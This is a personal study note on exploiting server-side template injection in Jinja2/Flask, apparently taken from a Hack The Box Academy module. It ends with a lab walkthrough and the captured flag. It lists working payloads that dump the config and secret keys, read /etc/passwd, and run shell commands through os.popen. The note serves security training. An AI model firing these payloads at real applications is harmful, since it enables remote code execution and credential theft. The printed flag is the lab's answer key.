---
sticker: lucide//book-template
---
Now that we have seen how to identify the template engine used by a web application vulnerable to SSTI, we will move on to the exploitation of SSTI. In this section, we will assume that we have successfully identified that the web application uses the `Jinja` template engine. We will only focus on the SSTI exploitation and thus assume that the SSTI confirmation and template engine identification have already been done in a previous step.

Jinja is a template engine commonly used in Python web frameworks such as `Flask` or `Django`. This section will focus on a `Flask` web application. The payloads in other web frameworks might thus be slightly different.

In our payload, we can freely use any libraries that are already imported by the Python application, either directly or indirectly. Additionally, we may be able to import additional libraries through the use of the `import` statement.

---

## Information Disclosure

We can exploit the SSTI vulnerability to obtain internal information about the web application, including configuration details and the web application's source code. For instance, we can obtain the web application's configuration using the following SSTI payload:

```jinja2
{{ config.items() }}
```

   

![](https://academy.hackthebox.com/storage/modules/145/ssti/ssti_exploitation_1_1.png)

Since this payload dumps the entire web application configuration, including any used secret keys, we can prepare further attacks using the obtained information. We can also execute Python code to obtain information about the web application's source code. We can use the following SSTI payload to dump all available built-in functions:


```jinja2
{{ self.__init__.__globals__.__builtins__ }}
```

   

![](https://academy.hackthebox.com/storage/modules/145/ssti/ssti_exploitation_1_2.png)

---

## Local File Inclusion (LFI)

We can use Python's built-in function `open` to include a local file. However, we cannot call the function directly; we need to call it from the `__builtins__` dictionary we dumped earlier. This results in the following payload to include the file `/etc/passwd`:

```jinja2
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
```

   

![](https://academy.hackthebox.com/storage/modules/145/ssti/ssti_exploitation_1_3.png)

---

## Remote Code Execution (RCE)

To achieve remote code execution in Python, we can use functions provided by the `os` library, such as `system` or `popen`. However, if the web application has not already imported this library, we must first import it by calling the built-in function `import`. This results in the following SSTI payload:


```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

   

![](https://academy.hackthebox.com/storage/modules/145/ssti/ssti_exploitation_1_4.png)

# Question
---

![](cybersecurity/images/Pasted%2520image%252020250212131624.png)

We can begin by identifying if the page is vulnerable to SSTI:

![](cybersecurity/images/Pasted%2520image%252020250212131817.png)

![](cybersecurity/images/Pasted%2520image%252020250212131825.png)

This could be a good indicator that the server is indeed vulnerable to SSTI, let's use an identifier for `jinja2` and check if it works:

```jinja2
{{ config.items() }}
```


We can check the web application's configuration by using that payload:

![](cybersecurity/images/Pasted%2520image%252020250212131952.png)

Ok, it is vulnerable, let's get RCE:

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

![](cybersecurity/images/Pasted%2520image%252020250212132022.png)

We are root, let's try to read the `/` directory:

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls /').read() }}
```

![](cybersecurity/images/Pasted%2520image%252020250212132107.png)

There is our flag, let's read it:

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}
```

![](cybersecurity/images/Pasted%2520image%252020250212132138.png)

Got it: 

```
HTB{295649e25b4d852185ba34907ec80643}
```

